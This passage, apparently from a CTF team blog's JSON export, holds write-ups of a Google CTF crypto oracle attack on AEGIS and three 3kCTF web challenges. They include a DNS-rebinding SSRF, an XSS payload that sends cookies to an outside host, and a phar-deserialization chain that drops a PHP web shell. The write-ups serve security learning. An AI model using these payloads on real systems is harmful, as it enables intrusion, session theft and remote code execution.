are the first-to-solve to the challenge. It took us around two hours to win the flag. This writeup is written by @harrier_lcc and @mystiz613.\nChallenge Summary  We wanted to plant a lot of trees, but it's going kinda slow.","title":"CONFidence 2020 CTF: Team Trees"},{"content":"I was teamed-up with @blackb6a on Google CTF this time. I have solved 7 challenges alone and 3 challenges with my teammates.\nIn particular, Oracle is a crypto challenge with 13 solves. It has got me spending 12 hours. All in all, it was a great experience in terms of learning, but my liver hurts. This piece of writeup may be very computation intensive, just because I would like to make everything clear.\nChallenge Summary There are two parts of the challenges. In the first part, we are required to recover an internal state for AEGIS-128L given the encryption oracle. For the second part, we are required to forge a ciphertext given an error oracle from decryption.\nSolution Part I: A brief summary for the state in AEGIS-128L AEGIS-128L has an internal state that is initially computed solely by the key and the IV. It is of 128 bytes, broken into eight 16-byte blocks. Let's $S_i$ is updated to $S_{i+1}$ given 32-byte payload $M$. Let's define $S_i = (s_{i, 0}, s_{i, 1}, ..., s_{i, 7})$ and $M = (m_0, m_1)$. We have:\n $s_{i+1, 0} \\leftarrow \\text{AESEnc}(s_{i, 7}, s_{i, 0}) \\oplus m_0$, $s_{i+1, 4} \\leftarrow \\text{AESEnc}(s_{i, 3}, s_{i, 4}) \\oplus m_1$, and $s_{i+1, j} \\leftarrow \\text{AESEnc}(s_{i, j-1}, s_{i, j})$ for $j = 1, 2, 3, 5, 6, 7$.  But what is AESEnc? Let's see the implementation.\ndef aes_enc(s: block, t: block) -\u0026gt; block: \u0026#34;\u0026#34;\u0026#34;Performs the AESENC operation with tables.\u0026#34;\u0026#34;\u0026#34; t0 = (te0[s[0]] ^ te1[s[5]] ^ te2[s[10]] ^ te3[s[15]]) t1 = (te0[s[4]] ^ te1[s[9]] ^ te2[s[14]] ^ te3[s[3]]) t2 = (te0[s[8]] ^ te1[s[13]] ^ te2[s[2]] ^ te3[s[7]]) t3 = (te0[s[12]] ^ te1[s[1]] ^ te2[s[6]] ^ te3[s[11]]) s = _block_from_ints([t0, t1, t2, t3]) return _xor(s, t) Well... we will go through this later. Let's introduce how keystreams are generated from the state. It is (relatively) simple. The keystream $(k_{i, 0}, k_{i, 1})$ for the $i$-th round is given by:\n\\[ k_{i, 0} = (s_{i, 2} \\wedge s_{i, 3}) \\oplus s_{i, 1} \\oplus s_{i, 6}, \\\\ k_{i, 1} = (s_{i, 6} \\wedge s_{i, 7}) \\oplus s_{i, 5} \\oplus s_{i, 2}. \\]\nPart II: Recovering part of the state Now we are given that key and IV are unchanged. This implies that the initial state, i.e., $s_{00}, s_{01}, ..., s_{09}$ are constants too.\nSuppose that we have two 96-byte messages $M^{(1)}$ and $M^{(2)}$ with only the first two blocks are different (Formally, if $M^{(k)} := (m^{(k)}_{00}, m^{(k)}_{01}, ..., m^{(k)}_{21}$), then $m^{(1)}_{ij} = m^{(2)}_{ij}$ if and only if $i \\neq 0$).\nThe following table summarizes which of the $s_{ij}$'s that would be different (marked by an !), when encrypting $M^{(1)}$ and $M^{(2)}$ respectively.\n   $i$ \\ $j$ 0 1 2 3 4 5 6 7     0           1 !    !      2 ! !   ! !      What does this imply? Knowing that $s^{(1)}_{2,j} = s^{(2)}_{2,j}$ for $j = 2, 3, 6, 7$. Let's look closely on the last 32 bytes of the keystream:\n\\[ \\begin{aligned} k^{(1)}_{20} \\oplus k^{(2)}_{20} \u0026= m^{(1)}_{20} \\oplus c^{(1)}_{20} \\oplus m^{(2)}_{20} \\oplus c^{(2)}_{20} \\\\ \u0026= \\left[ (s^{(1)}_{22} \\wedge s^{(1)}_{23}) \\oplus s^{(1)}_{21} \\oplus s^{(1)}_{26} \\right] \\oplus \\left[ (s^{(2)}_{22} \\wedge s^{(2)}_{23}) \\oplus s^{(2)}_{21} \\oplus s^{(2)}_{26} \\right] \\\\ \u0026= s^{(1)}_{21} \\oplus s^{(2)}_{21}. \\end{aligned} \\]\nAnd similarly $k^{(1)}_{21} \\oplus k^{(2)}_{21} = s^{(1)}_{25} \\oplus s^{(2)}_{25}$.\nWhy is it useful? Let's define a new function, p:\ndef p(s: block) -\u0026gt; block: t0 = (te0[s[0]] ^ te1[s[5]] ^ te2[s[10]] ^ te3[s[15]]) t1 = (te0[s[4]] ^ te1[s[9]] ^ te2[s[14]] ^ te3[s[3]]) t2 = (te0[s[8]] ^ te1[s[13]] ^ te2[s[2]] ^ te3[s[7]]) t3 = (te0[s[12]] ^ te1[s[1]] ^ te2[s[6]] ^ te3[s[11]]) return _block_from_ints([t0, t1, t2, t3]) Déjà vu? It is more or less the same with AESEnc. We can state that AESEnc(s, t) == p(s) ^ t too. Looking even more closely, one could observe that the first four bytes from p solely depends on bytes 0, 5, 10 and 15 from s.\nKnowing this, we can further expand $k^{(1)}_{20} \\oplus k^{(2)}_{20}$:\n\\[\\begin{aligned} k^{(1)}_{20} \\oplus k^{(2)}_{20} \u0026= s^{(1)}_{21} \\oplus s^{(2)}_{21} \\\\ \u0026= \\text{AESEnc}(s^{(1)}_{10}, s^{(1)}_{11}) \\oplus \\text{AESEnc}(s^{(2)}_{10}, s^{(2)}_{11}) \\\\ \u0026= p(s^{(1)}_{10}) \\oplus s^{(1)}_{11} \\oplus p(s^{(2)}_{10}) \\oplus s^{(2)}_{11} \\\\ \u0026= p(s^{(1)}_{10}) \\oplus p(s^{(2)}_{10}) \\\\ \u0026= p\\left(\\text{AESEnc}(s^{(1)}_{07}, s^{(1)}_{00}) \\oplus m^{(1)}_{00}\\right) \\oplus p\\left(\\text{AESEnc}(s^{(2)}_{07}, s^{(2)}_{00}) \\oplus m^{(2)}_{00}\\right) \\\\ \u0026= p(x \\oplus m^{(1)}_{00}) \\oplus p(x \\oplus m^{(2)}_{00}). \\end{aligned}\\]\n(We define $x := \\text{AESEnc}(s_{07}, s_{00}) = s_{10} \\oplus m^{(1)}_{00}$ for ease of reading.)\nAnd now the only unknown is $x$. Can we solve it easily? Yes indeed: we can compute bytes 0, 5, 10, 15 of $x$ from the first four bytes of $k^{(1)}_{20} \\oplus k^{(2)}_{20}$. Along with three more equalities from p, we are able to recover $x$ completely. I used an meet-in-the-middle approach to solve for $x$ in five seconds.\n But wait. There is a problem: I am able to find 65536 candidates (or even more) instead of 1, but I am unable to eliminate the rest. The possible number of states will be growing exponentally! What can I do? The solution is actually simple: Just send $M^{(3)}$ and compute another solution set of $x$. After all, it is very likely that $x$ is the only element in the intersection of the two sets. With $x$, we are able to compute $s_{10}$ (respectively $s_{14}$).\nPart III: Finishing the first part of the challenge We can extend the above idea to leak more. By sending two 128-byte messages with blocks 3 and 4 being different, we are able to recover $s_{20}$ and $s_{24}$. We are able to leak $s_{30}$ and $s_{34}$ with the same idea.\nTwo more questions remain: How is it made possible in seven queries? And more importantly, how can we recover $s_{ij}$ for all $j$, for some $i$ (preferably $i = 0\\ \\text{or}\\ 1$)?\nChallenge 1. Recover the above states in 7 queries.\nIn short, we are encrypting these seven plaintexts (each 0 represents 16 \\x00's, etc):\n 0000000000 0000110000 0000220000 - Derive $s_{10}$ and $s_{14}$ uniquely with (1) and (2) 0000001100 0000002200 - Derive $s_{20}$ and $s_{24}$ uniquely with (1) and (4) 0000000011 0000000022 - Derive $s_{30}$ and $s_{34}$ uniquely with (1) and (6)  Challenge 2. Recover $s_{1, j}$ for all $j$.\nFrom above, we are able to derive $s_{i, 0}$ and $s_{i, 4}$ for $i = 1, 2, 3$ with $m_{ij} = 0$. Hence, the state transition would be $s_{i+1, j} \\leftarrow p(s_{i, j-1}) \\oplus s_{ij}$ for all $i, j$. Equivalently $s_{i, j-1} = p^{-1}(s_{i+1, j} \\oplus s_{ij})$.\nWe are able to compute inverses of $p^{-1}$ easily. Solving system of linear equations would be all good, but I'm doing it with meet-in-the-middle. Code reuse for the win! For now, let's visualize how $s_{1, j}$'s can be derived.\ndigraph { rankdir=BT s₁₀[fillcolor=yellow,style=filled] s₁₄[fillcolor=yellow,style=filled] s₂₀[fillcolor=yellow,style=filled] s₂₄[fillcolor=yellow,style=filled] s₃₀[fillcolor=yellow,style=filled] s₃₄[fillcolor=yellow,style=filled] s₂₀ -\u0026gt; s₂₇ s₃₀ -\u0026gt; s₂₇ s₂₄ -\u0026gt; s₂₃ s₃₄ -\u0026gt; s₂₃ s₁₄ -\u0026gt; s₁₃ s₂₄ -\u0026gt; s₁₃ s₁₃ -\u0026gt; s₁₂ s₂₃ -\u0026gt; s₁₂ s₁₀ -\u0026gt; s₁₇ s₂₀ -\u0026gt; s₁₇ s₁₇ -\u0026gt; s₁₆ s₂₇ -\u0026gt; s₁₆ s₁₂ -\u0026gt; s₁₁ s₁₃ -\u0026gt; s₁₁ s₁₆ -\u0026gt; s₁₁ s₁₆ -\u0026gt; s₁₅ s₁₇ -\u0026gt; s₁₅ s₁₂ -\u0026gt; s₁₅ } After all, the first part of the challenge is done.\nPart IV: AEGIS-128 vs AEGIS-128L For the second part, AEGIS-128 is used. The state is now 80 bytes (five 16-byte blocks). The payload size has been reduced to one block (let's denote it by $m$). This is how the state transited:\n $s_{i+1, 0} \\leftarrow p(s_{i, 4}) \\oplus s_{i, 0} \\oplus m$, and $s_{i+1, j} \\leftarrow p(s_{i, j-1}) \\oplus s_{i, j}$ for $1 \\leq j \\leq 4$.  Moreover, the keystream $k_i$ for the $i$-th round is also altered: $k_i = (s_{i, 2} \\wedge s_{i, 3}) \\oplus s_{i, 1} \\oplus s_{i, 4}$.\nPart V: Exploring the challenge I have no idea what's going on, so I decided to recover the printable secret_plaintext first.\nIt is pretty easy, and is made possible because we are able to receive the error from the oracle. In particular, from pt.decode(\u0026quot;ascii\u0026quot;).\nWe are able to recover the plaintext with bit-flipping. To begin with, we can flip the whole ciphertext by \\x80. The first 32 bytes for the plaintext would be flipped by \\x80 as well. If we send the flipped ciphertext (denote by $c_?$) to the oracle, we will obtain:\nUnicodeDecodeError: \u0026#39;ascii\u0026#39; codec can\u0026#39;t decode byte 0xe7 in position 0: ordinal not in range(128) This means that the first byte of the flipped plaintext would be \\xe7. Hence, the first byte of the plaintext is \\x67 (g). We then flip the first byte of $c_?$ by \\x80 and send it to the oracle, we will be receiving another error:\nUnicodeDecodeError: \u0026#39;ascii\u0026#39; codec can\u0026#39;t decode byte 0xc6 in position 1: ordinal not in range(128) This recovers the second byte - x46 (F). Since the secret plaintext is 96-byte long, we can recover it with 96 oracle calls.\nREMAINING ORACLE CALLS: 231 - 96 = 135.\nWith a plaintext recovered, it is time for us to try to recover the internal state. Can we devise a similar strategy that is similar to the first part of the challenge? Formally, what will happen if we have two 48-byte messages $M^{(1)} := (m^{(1)}_0, m^{(1)}_1, m^{(1)}_2)$ and $M^{(2)} := (m^{(2)}_0, m^{(2)}_1, m^{(2)}_2)$ with only the first block being different. Then the last 16 bytes in the keystream will be:\n\\[ \\begin{aligned} k^{(1)}_2 \\oplus k^{(2)}_2 \u0026= \\left[ (s^{(1)}_{22} \\wedge s^{(1)}_{23}) \\oplus s^{(1)}_{21} \\oplus s^{(1)}_{24} \\right] \\oplus \\left[ (s^{(2)}_{22} \\wedge s^{(2)}_{23}) \\oplus s^{(2)}_{21} \\oplus s^{(2)}_{24} \\right] \\\\ \u0026= s^{(1)}_{21} \\oplus s^{(2)}_{21} \\\\ \u0026= p(s^{(1)}_{10}) \\oplus s^{(1)}_{11} \\oplus p(s^{(2)}_{10}) \\oplus s^{(2)}_{11} \\\\ \u0026= p(s^{(1)}_{10}) \\oplus p(s^{(2)}_{10}) \\\\ \u0026= p\\left(\\text{AESEnc}(s^{(1)}_{04}, s^{(1)}_{00}) \\oplus m^{(1)}_1\\right) \\oplus p\\left(\\text{AESEnc}(s^{(2)}_{04}, s^{(2)}_{00}) \\oplus m^{(2)}_1\\right) \\\\ \u0026= p(x \\oplus m^{(1)}_0) \\oplus p(x \\oplus m^{(2)}_0). \\end{aligned} \\]\nHereby denote $x := \\text{AESEnc}(s_{04}, s_{00}) = s_{10} \\oplus m^{(1)}_0$. Simply put, if we have the ciphertexts for $M^{(1)}$ and $M^{(2)}$ (denote it as $C^{(k)} = (c^{(k)}_0, c^{(k)}_1, c^{(k)}_2)$), we are able to recover one-fifths of the state if this happens.\nHow are we able to do it? Well actually, we have recovered the secret plaintext above. We can flip the first block of the ciphertext arbitrarily (to $C_?$).\nHowever, since $k^{(2)}_2$ is altered, the third block of the message would be updated. Luckily we are able to recover the message in 17 oracle calls. Here's how:\n Sends $C_?$. We will obtain something like this: UnicodeDecodeError: 'ascii' codec can't decode byte 0xe8 in position 34... Flips the 35th byte by \\xe8 in $C_?$. Sends the patched $C_?$: UnicodeDecodeError: 'ascii' codec can't decode byte 0xcb in position 35... Flips the 36th byte by \\xcb in $C_?$. Repeat the process until we receive OK, meaning that the plaintext is now ASCII-encoded. For now, we have recovered a subset of message bytes. We then flip the unknown bytes by \\x80 (for example, bytes 33 and 34) to throw errors from the oracle. Repeat step 1 until all unknown bytes are recovered.  In short, we spent 16 oracle calls to recover the message, and one oracle call to indicate us to flip all the bytes those were originally printable. We are then able to recover a possible set of $s_{10}$ with 65536 entries (or more). We can spend another 17 queries to find the actual $s_{10}$, however.\nREMAINING ORACLE CALLS: 135 - 17\u0026times;2 = 101.\nWith the same idea, we can recover $s_{20}, s_{30}, s_{40}$ with 17\u0026times;6 queries. This would allow us to recover $s_{10}, s_{11}, ..., s_{14}$ and hence forging arbitrary messages (along with a slightly longer AD).\nREMAINING ORACLE CALLS: 101 - 17\u0026times;6 = -1.\nShoot - we are one query short. Since we are able to recover one byte of the plaintext in each of the queries, so it doesn't hurt to sacrifice one oracle calls by guessing one byte. So... in theory, we are able to finish the challenge with once every 256 times.\nLuckily, if we are given a incorrect plaintext (actually keystream), we are unable to recover a single $s_*$. That's pretty good, we are able to solve the challenge every time.\nREMAINING ORACLE CALLS: -1 + 1 = :tada:.\nWith the exploit script written, I am able to reach the very end locally. Congratulations to me!\nPart IV: Wait... Aren't we done? No... When I am interacting to the server, I am always disconnected while sending one of the 231 oracle calls. Asking the organizers in IRC, knowing that there was an 1-minute timeout - it was later increased to 10 minutes. Unfortunately, my solution runs for around 5 minutes. I have two choices:\n Wait until the challenge has a 10-minute timeout, or Optimize the script and have it completed in one minute.  Seeing that there are already few teams solving the challenge, I think (2) would be fun.\n6.1. Reducing online complexity For inputs that does not require immediate feedbacks, we can send them at the same time. This is an example when I am recovering secret_plaintext in the second part.\n# Before optimization test_ciphertext = bytes([c^0x80 for c in ciphertext]) m0 = b\u0026#39;\u0026#39; for i in range(96): r.sendline(base64.b64encode(test_ciphertext)) test_ciphertext = cxor(test_ciphertext, i, 0x80) p, mc = try_decrypt_read(r) assert p == i m0 += bytes([mc^0x80]) # After optimization test_ciphertext = bytes([c^0x80 for c in ciphertext]) m0 = b\u0026#39;\u0026#39; for i in range(96): r.sendline(base64.b64encode(test_ciphertext)) test_ciphertext = cxor(test_ciphertext, i, 0x80) for i in range(96): p, mc = try_decrypt_read(r) assert p == i m0 += bytes([mc^0x80]) 6.2. Reducing offline complexity For example, this is the method I implemented to solve for $x$ from $p(x \\oplus a) \\oplus p(x \\oplus b) = c$ - it takes one second each time:\ndef px_subsolve(a_sub, b_sub, c_sub): # Given a_sub, b_sub, c_sub (4 bytes), find x_sub such that # te0[(x_sub ^ a_sub)[0]] ^ te1[(x_sub ^ a_sub)[1]] ^ te2[(x_sub ^ a_sub)[2]] ^ te3[(x_sub ^ a_sub)[3]] # ^ te0[(x_sub ^ a_sub)[0]] ^ te1[(x_sub ^ a_sub)[1]] ^ te2[(x_sub ^ a_sub)[2]] ^ te3[(x_sub ^ a_sub)[3]] # = c_sub # Reformulating: # te0[(x_sub ^ a_sub)[0]] ^ te1[(x_sub ^ a_sub)[1]] ^ te0[(x_sub ^ a_sub)[0]] ^ te1[(x_sub ^ a_sub)[1]] ^ c_sub # = te2[(x_sub ^ a_sub)[2]] ^ te3[(x_sub ^ a_sub)[3]] ^ te2[(x_sub ^ a_sub)[2]] ^ te3[(x_sub ^ a_sub)[3]] lhss = {} for x0, x1 in itertools.product(range(256), repeat=2): # LHS xs = [be0[x0^a_sub[0]], be0[x0^b_sub[0]], be1[x1^a_sub[1]], be1[x1^b_sub[1]], c_sub] y = reduce(_xor, xs) lhss[y] = lhss.get(y, []) + [(x0, x1)] solns = [] for x2, x3 in itertools.product(range(256), repeat=2): # RHS xs = [be2[x2^a_sub[2]], be2[x2^b_sub[2]], be3[x3^a_sub[3]], be3[x3^b_sub[3]]] y = reduce(_xor, xs) for x0, x1 in lhss.get(y, []): solns.append(bytes([x0, x1, x2, x3])) return solns However, if we force a_sub == b'\\0'*4 and b_sub == b'\\1'*4 or b_sub == b'\\2'*4, the right hand side can be precomputed. We are able to solve for $x$ once every 0.2 second.\nAt last - we are able to get the flag in 30 seconds locally and around 55 seconds online! :tada:\n Credits  Thanks @harrier_lcc who noticed that my lever did not hurt. Playing Minecraft too much, I misspelt liver. Thanks @hellman1908 for pointing that we are able to bruteforce byte by byte instead of bruteforcing columns, since that we can apply MixColumns inverse.  ","permalink":"https://b6a.black/posts/2020-08-25-google-ctf-oracle/","summary":"I was teamed-up with @blackb6a on Google CTF this time. I have solved 7 challenges alone and 3 challenges with my teammates.\nIn particular, Oracle is a crypto challenge with 13 solves. It has got me spending 12 hours. All in all, it was a great experience in terms of learning, but my liver hurts. This piece of writeup may be very computation intensive, just because I would like to make everything clear.","title":"Google CTF 2020: Oracle"},{"content":"reporter (Web; 498 points) Solved by apple.\nAuthor: rekter0\n Reporter is an online markdown reporting tool. it's free to use for everyone. there's a secret report we need located here\nsource\n Walkthrough The application provide markdown hosting service and it will automatically download and embed external images (or any files) to the 'report'.\nThere are 4 buttons on the interface: Edit, Preview, Save, and Deliver.\nThe first target of the challenge is to access the secret_report.\ncurl http://reporter.3k.ctf.to/secret_report \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;403 Forbidden\u0026lt;/title\u0026gt; ... Well, knew that.\nExploiting TOCTOU of the domain checking Interesting things happen in backend.php.\nif(@$_POST[\u0026#39;deliver\u0026#39;]){ $thisDoc=file_get_contents($dir.\u0026#39;/file.html\u0026#39;); $images = preg_match_all(\u0026#34;/\u0026lt;img src=\\\u0026#34;(.*?)\\\u0026#34;/\u0026#34;, $thisDoc, $matches); foreach ($matches[1] as $key =\u0026gt; $value) { $thisDoc = str_replace($value , \u0026#34;data:image/png;base64,\u0026#34;.base64_encode(fetch_remote_file($value)) , $thisDoc ) ; } When user click on the deliver button it will get the saved document, fetch_remote_file and embed it to the report with base64. Therefore users can embed images from external image hosting sites such as imgur etc.\nHow about embedding the secret_report? It does not work as it do a long list of checks:\nfunction fetch_remote_file($url) { $config[\u0026#39;disallowed_remote_hosts\u0026#39;] = array(\u0026#39;localhost\u0026#39;); $config[\u0026#39;disallowed_remote_addresses\u0026#39;] = array(\u0026#34;0.0.0.0/8\u0026#34;, \u0026#34;10.0.0.0/8\u0026#34;, \u0026#34;100.64.0.0/10\u0026#34;, \u0026#34;127.0.0.0/8\u0026#34;, \u0026#34;169.254.0.0/16\u0026#34;, \u0026#34;172.16.0.0/12\u0026#34;, \u0026#34;192.0.0.0/29\u0026#34;, \u0026#34;192.0.2.0/24\u0026#34;, \u0026#34;192.88.99.0/24\u0026#34;, \u0026#34;192.168.0.0/16\u0026#34;, \u0026#34;198.18.0.0/15\u0026#34;, \u0026#34;198.51.100.0/24\u0026#34;, \u0026#34;203.0.113.0/24\u0026#34;, \u0026#34;224.0.0.0/4\u0026#34;, \u0026#34;240.0.0.0/4\u0026#34;,); // ...  $addresses = get_ip_by_hostname($url_components[\u0026#39;host\u0026#39;]); $destination_address = $addresses[0]; // ... checks if the destination_address is in the disallowed list ...  $opts = array(\u0026#39;http\u0026#39; =\u0026gt; array(\u0026#39;follow_location\u0026#39; =\u0026gt; 0,)); $context = stream_context_create($opts); return file_get_contents($url, false, $context); } function get_ip_by_hostname($hostname) { $addresses = @gethostbynamel($hostname); if (!$addresses) { // ... more attempts to get dns A records ...  } return $addresses; } If we change the DNS record very quickly, which the DNS server return 1.1.1.1 at get_ip_by_hostname when it do the checking, and we return 127.0.0.1 at file_get_contents we can access the localhost and maybe we can get the secret_report.\nTherefore I wrote a script1 to act as a nameserver and give different responses.\n$ dig +short 4kctf.example.com @8.8.8.8 1.1.1.1 $ dig +short 4kctf.example.com @8.8.8.8 127.0.0.1 payload\n![](http://4kctf.example.com/secret_report/) The result is a file listing with two files:\n3ac45ca05705d39ed27d7baa8b70ecd560b69902.php secret2 63b4bacc828939706ea2a84822a4505efa73ee3e.php not much here The 3ac45ca05705d39ed27d7baa8b70ecd560b69902.php is suspicious as it have 50 bytes but only 7 bytes returned from server. Maybe the flag is there.\nWonders of PHP: empty(\u0026quot;0\u0026quot;) == true I crafted this payload to read the file and get the flag.\n![](0:/../secret_report/3ac45ca05705d39ed27d7baa8b70ecd560b69902.php) Back to the backend.php fetch_remote_file, besides DNS checking it also parse_url and checks scheme, port, etc.\nfunction fetch_remote_file($url) { // ...  $url_components = @parse_url($url); if (!isset($url_components[\u0026#39;scheme\u0026#39;])) { return false; } if (@($url_components[\u0026#39;port\u0026#39;])) { return false; } if (!$url_components) { return false; } if ((!empty($url_components[\u0026#39;scheme\u0026#39;]) \u0026amp;\u0026amp; !in_array($url_components[\u0026#39;scheme\u0026#39;], array(\u0026#39;http\u0026#39;, \u0026#39;https\u0026#39;)))) { return false; } if (array_key_exists(\u0026#34;user\u0026#34;, $url_components) || array_key_exists(\u0026#34;pass\u0026#34;, $url_components)) { return false; } // ...  return file_get_contents($url, false, $context); parse_url will parse as follows\narray(2) { [\u0026#34;scheme\u0026#34;]=\u0026gt; string(1) \u0026#34;0\u0026#34; [\u0026#34;path\u0026#34;]=\u0026gt; string(62) \u0026#34;/../secret_report/3ac45ca05705d39ed27d7baa8b70ecd560b69902.php\u0026#34; } Where the scheme will return true for isset and true for empty (empty(\u0026quot;0\u0026quot;) == true), and for file_get_contents it will recognize 0: as a folder and 0:/../ as current folder.\nxsser (Web; 499 points) Solved by ozetta.\nDescription  challenge\nAuthor: Dali\n Walkthrough Source code is provided:\n\u0026lt;?php include(\u0026#39;flag.php\u0026#39;); class User { public $name; public $isAdmin; public function __construct($nam) { $this-\u0026gt;name = $nam; $this-\u0026gt;isAdmin=False; } } ob_start(); if(!(isset($_GET[\u0026#39;login\u0026#39;]))){ $use=new User(\u0026#39;guest\u0026#39;); $log=serialize($use); header(\u0026#34;Location: ?login=$log\u0026#34;); exit(); } $new_name=$_GET[\u0026#39;new\u0026#39;]; if (isset($new_name)){ if(stripos($new_name, \u0026#39;script\u0026#39;))//no xss :p  { $new_name = htmlentities($new_name); } $new_name = substr($new_name, 0, 32); echo \u0026#39;\u0026lt;h1 style=\u0026#34;text-align:center\u0026#34;\u0026gt;Error! Your msg \u0026#39;.$new_name.\u0026#39;\u0026lt;/h1\u0026gt;\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;h1\u0026gt;Contact admin /req.php \u0026lt;/h1\u0026gt;\u0026#39;; } if($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] == \u0026#39;127.0.0.1\u0026#39;){ setcookie(\u0026#34;session\u0026#34;, $flag, time() + 3600); } $check=unserialize(substr($_GET[\u0026#39;login\u0026#39;],0,56)); if ($check-\u0026gt;isAdmin){ echo \u0026#39;welcome back admin \u0026#39;; } ob_end_clean(); show_source(__FILE__); From the challenge name it is about XSS. After setting $_GET['login'], you can enter something in $_GET['new'], which is supposed to be reflected on the page for XSS.\nThanks to ob_start(); and ob_end_clean();, nothing about the user input are printed in the normal case.\nTo address this, we can make the interpreter panic before ob_end_clean();. Maybe unserialize could do so?\nBut most of the time unserialize just returns FALSE when you input some garbage that is \u0026quot;un-unserialize-able\u0026quot; (pun intended)\nLet's try to unserialize some meaningful junks:\n\u0026lt;?php foreach (get_declared_classes() as $c) { unserialize(\u0026#39;O:\u0026#39;.strlen($c).\u0026#39;:\u0026#34;\u0026#39;.$c.\u0026#39;\u0026#34;:0:{}\u0026#39;); } It shows Fatal error: Uncaught Error: Invalid serialization data for DateTime object. So DateTime should do the trick.\nHow about the actual XSS payload? We can't use \u0026lt;script src=//blah\u0026gt;\u0026lt;/script\u0026gt;.\nFor some reason script\u0026lt;script src=//blah\u0026gt;\u0026lt;/script\u0026gt; could bypass that stripos but it is too long.\nLater on I found that /req.php accepts external URLs as well. So we can use some other tricks like window.name:\n\u0026lt;script\u0026gt;name=\u0026#39;location=\u0026#34;//blah/\u0026#34;+document.cookie\u0026#39;;location=\u0026#39;//127.0.0.1/?new=%3Cbody%20onload=eval(name)%3E\u0026amp;login=O:8:%22DateTime%22:0:%7B%7D\u0026#39;;\u0026lt;/script\u0026gt; Remarks At first I tried the payload with iframe but Chrome blocks the Set-Cookie header due to \u0026quot;third-party cookies preference\u0026quot;.\nThen I tried the payload with form and Chrome blocks the popup as expected. But for some reason the Headless Chrome works.\nimage uploader (Web; 498 points) Solved by ozetta.\nDescription  challenge\nsource\nAuthor: Dali\n 題解 (Walkthrough) 我知你睇唔明廣東話架啦. 今次有翻譯.\n I know you don't understand Cantonese. This time got translation.\n 個 description 得兩條奸笑5678. 是但啦有醬油有計傾.\n (Some unimportant gibberish)\n 一開 index.php 就見到 include('old.php');//todo remove this useless file :\\\n After opening index.php then we can see that include stuff...\n 明眼人一睇就知係伏啦. 一睇兩個 Class 重唔係玩 unserialize.\n Obviously it is the vulnerable point. It contains 2 classes so obviously it is about unserialize.\n 碌落 D (唔好譯啦你譯唔到個 D 架啦) 個 index.php 見到 file_get_contents. 條件反射 phar unserialize\n Scroll down [Don't translate that \u0026quot;D\u0026quot;, you can't] that index.php, we can see file_get_contents. It immediately links to phar unserialize\n 有個 upload.php 真係可以 upload 野. 不過會 check getimagesize 同 image/jpeg\n There is an upload.php that can really upload things. But it checks with getimagesize and image/jpeg.\n 睇返個 old.php, 又係驗眼嘅時間. 最底有個 $data = \u0026quot;\u0026lt;?php\\n//\u0026quot; . sprintf('%012d', $expire) . \u0026quot;\\n exit();?\u0026gt;\\n\u0026quot; . $data; 但係無咩用.\n Let's go back to old.php and check our eyesight. The bottom $data = \u0026quot;\u0026lt;?php... looks interesting but unless.\n 除非個 sprintf('%012d', $expire) 可以整走個 exit() 啦.\n Unless sprintf('%012d', $expire) could be used to get rid of that exit().\n 再碌上 D 見到個詭異嘅 variable function return $serialize($data);. 咁開心.\n Scroll up a bit then we can see a weird variable function return $serialize($data);. So exciting.\n 所以如果將 $this-\u0026gt;options['serialize'] 改做 system 就可以行 system.\n So if we set $this-\u0026gt;options['serialize'] to system then we could run system.\n 但係個 $data 要點砌呢. 根據所謂 POP 可以 trace 到:\n But how can we control $data? According to the so-called Property-Oriented Programming, you can trace like this:\n $this-\u0026gt;options['serialize']($data) //cl2-\u0026gt;serialize\n=\u0026gt; $this-\u0026gt;serialize($value) //cl2-\u0026gt;set\n=\u0026gt; $this-\u0026gt;store-\u0026gt;set($this-\u0026gt;key, $this-\u0026gt;getForStorage(), $this-\u0026gt;expire); //cl1-\u0026gt;save\n=\u0026gt; return json_encode([$this-\u0026gt;cleanContents($this-\u0026gt;cache), $this-\u0026gt;complete]); //cl1-\u0026gt;getForStorage()\n首先個 $data 有少少限制. 因為係 json_encode 個 Array.\n First, the $data is a bit restricted. Because it is constructed by json_encode-ing an array.\n 不過你想用 system 行 command 其實可以好求其. 好似咩 $(ls).\n But if you just need to use system to execute command, it is pretty flexible. Like using $(ls).\n 最後可以砌到好似 system('[\u0026quot;$(ls)\u0026quot;,0]').\n At the end of the day we should be able to construct like system('[\u0026quot;$(ls)\u0026quot;,0]').\n 要 trigger cl1-\u0026gt;save, destructor 個 $this-\u0026gt;autosave 要 false.\n If you want to trigger cl1-\u0026gt;save, in the destructor, $this-\u0026gt;autosave should be false.\n 依家有齊啲餡啦. 要搵返 phar 個 payload.\n We are cooking with gas. Now we need to get the phar payload.\n 邊鬼個會記得點寫. 抄返自己個威噏.\n Who the heck will remember how to write the payload. Just copy my own write-up.\n https://github.com/ozetta/ctf-challenges/wiki/Envy-(Tangerine)\n由 $p = new Phar('malware.phar'); 果行抄起 (好似係)\n Copy the payload starting from $p = new Phar('malware.phar');\n 上面記得抄返個 Class definition 同埋改晒 D property 佢.\n Remember to copy the class definitions and change the properties to the desired one.\n 個 getimagesize 同 image/jpeg 點算? 求其攝個 jpg 向頭咪得囉.\n How to tackle getimagesize and image/jpeg? Just inject a jpg file in front.\n  Final payload \u0026lt;?php class cl1 { protected $store; protected $key; protected $expire; public function __construct($store, $key = \u0026#39;flysystem\u0026#39;, $expire = null) { $this-\u0026gt;key = $key; $this-\u0026gt;store = $store; $this-\u0026gt;expire = $expire; //add your own properties $this-\u0026gt;cache = [\u0026#39;$(echo PD89YCRfR0VUWzBdYDs= | base64 -d \u0026gt; /var/www/html/up/z.php)\u0026#39;]; $this-\u0026gt;autosave = 0; $this-\u0026gt;complete = 0; } } class cl2 { public function __construct(){ //add your own properties $this-\u0026gt;options[\u0026#39;serialize\u0026#39;] = \u0026#34;system\u0026#34;; $this-\u0026gt;writeTimes = 0; $this-\u0026gt;options[\u0026#39;prefix\u0026#39;] = \u0026#39;\u0026#39;; $this-\u0026gt;options[\u0026#39;data_compress\u0026#39;] = 0; } } $x = new cl1(new cl2(),\u0026#34;z\u0026#34;,0); $p = new Phar(\u0026#39;malware.phar\u0026#39;); $p-\u0026gt;startBuffering(); $p-\u0026gt;addFromString(\u0026#34;z\u0026#34;,\u0026#34;\u0026#34;); $j = file_get_contents(\u0026#34;1.jpg\u0026#34;); 